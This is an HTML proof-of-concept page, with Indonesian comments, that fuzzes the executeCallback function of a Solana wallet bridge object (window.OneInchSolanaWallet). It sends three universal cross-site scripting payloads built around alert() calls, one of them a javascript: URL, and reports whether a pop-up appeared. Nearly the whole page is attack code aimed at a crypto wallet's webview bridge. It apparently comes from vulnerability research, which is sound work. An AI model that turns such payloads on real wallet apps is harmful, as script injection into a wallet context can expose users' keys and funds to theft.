<!DOCTYPE html>
<html>
<body style="background: #000; color: #0f0; font-family: monospace; padding: 20px;">
    <h3>Fuzzing executeCallback...</h3>
    <div id="status">Menjalankan percobaan...</div>

    <script>
        const target = window.OneInchSolanaWallet;
        const msg = (t) => document.getElementById('status').innerText = t;

        if (target && target.executeCallback) {
            try {
                // Mencoba berbagai variasi payload yang sering tembus di bridge mobile
                const payloads = [
                    { id: "1", data: { result: "alert('UXSS_1')" } },
                    { id: "javascript:alert('UXSS_2')", data: {} },
                    { id: "1", data: "alert('UXSS_3')" }
                ];

                payloads.forEach(p => {
                    // Coba panggil dengan parameter id dan data
                    target.executeCallback(p.id, p.data);
                });
                
                msg("Payload terkirim. Cek apakah ada pop-up.");
            } catch(e) {
                msg("Error: " + e.message);
            }
        } else {
            msg("Fungsi executeCallback tidak ditemukan.");
        }
    </script>
</body>
</html>
